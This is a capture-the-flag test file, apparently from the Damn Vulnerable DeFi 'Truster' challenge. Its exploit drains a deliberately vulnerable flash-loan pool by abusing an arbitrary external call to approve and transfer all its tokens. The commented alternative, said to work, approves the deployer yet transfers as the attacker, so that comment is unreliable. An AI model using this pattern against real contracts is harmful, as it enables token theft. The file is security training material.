const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const attackTokenFactory = await ethers.getContractFactory('Attacker', attacker);
        this.attackContract = await attackTokenFactory.deploy();

        console.log(
            "Attacker: " + attacker.address,
            "\ndeployer: " + deployer.address,
            "\npool: " + this.pool.address,
            "\nattack contract: " + this.attackContract.address
        );

        //Version 1
        await this.attackContract.attack(attacker.address, this.pool.address, this.token.address, TOKENS_IN_POOL);


        /* The version 2 below works as well

        const ABI = ["function approve(address spender, uint256 amount)"];
        const interface = new ethers.utils.Interface(ABI);
        const data = interface.encodeFunctionData("approve", [deployer.address, TOKENS_IN_POOL]);

        await this.pool.flashLoan(0, attacker.address, this.token.address, data);
        await this.token.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
        */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

